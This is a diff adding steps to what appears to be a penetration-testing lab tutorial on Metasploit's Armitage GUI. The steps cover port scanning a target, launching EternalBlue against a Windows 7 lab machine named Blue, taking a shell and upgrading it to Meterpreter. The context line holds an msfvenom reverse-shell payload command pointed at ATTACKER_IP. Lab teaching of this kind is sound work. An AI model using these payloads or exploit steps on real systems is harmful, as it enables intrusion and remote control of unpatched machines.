@@ -412,7 +412,33 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=31337 -f exe
 - In the "nmap" tab, you will see the raw scan results.
   > ![image](https://user-images.githubusercontent.com/51442719/180647356-654debfc-17eb-45b3-a4a4-08c733b8f7b5.png)
   > - *Results from the Nmap port-scan*
+- Now that you have learned how to execute a basic port scan, try to execute various other scans against the target and see what additional information you may retrieve from a host.
+> 💡 `Hint`: A Comprehensive Scan will grab banners, enumerate software versions, enumerate OS versions, and much more!
  
+#### Exploitation with Armitage
+- Next up, we're going to show off exploitation with Armitage; our victim in our example is a Windows 7 machine (more specifically, Blue). 
+- This machine is vulnerable to the classic exploit "Eternal  Blue".  
+- To find this, we will focus on the far right tab with folders, we will expand the "Exploit" dropdown, then find the "Windows" dropdown, then the "SMB" dropdown, then you will see all of the exploits.
+  > ![image](https://user-images.githubusercontent.com/51442719/180647696-ce498520-5127-437a-8414-a94868da492c.png)
+  > - *Listing all the exploits within Armitage*
+- Next up, you can double click your exploit of choice, or drag and drop the exploit onto the host, and a new window will open up. 
+- Clicking "launch" will fire off the exploit. 
+  > ![image](https://user-images.githubusercontent.com/51442719/180647710-d145af13-a9f4-49ae-bd4f-ae13e69f377e.png)
+  > - *Eternal Blue Exploit  Module Information*
+- After clicking "Launch", you will notice a new "Exploit" tab open up. 
+- Armitage will run all of the regular checks that Metasploit normally does. 
+- In the case of Eternal Blue, it ran the standard check script followed by the exploit script until it got a successful shell. 
+- It's worth noting that by default in this Exploit, it chose a Bind shell.
+- Make sure you fully read the exploit information and options to see if a Bind Shell or a Reverse Shell is an option.
+  >![image](https://user-images.githubusercontent.com/51442719/180647719-c1ac52a1-f3db-457d-a3c8-1e22c0c15624.png)
+  > - *A Successful Exploitation Attempt from Armitage*
+- After you receive your shell, right-click on the host and select "Interact". 
+- This will open a standard shell you're familiar with. 
+- In order to get a Meterpreter shell, we recommend that you run the multi/manage/shell_to_meterpreter module.
+  > ![image](https://user-images.githubusercontent.com/51442719/180647730-46e02489-6ea5-4bbe-8a0a-fb05dd15d08f.png)
+  > - *Compromised Host in Armitage*
+
+
 
 ---
 
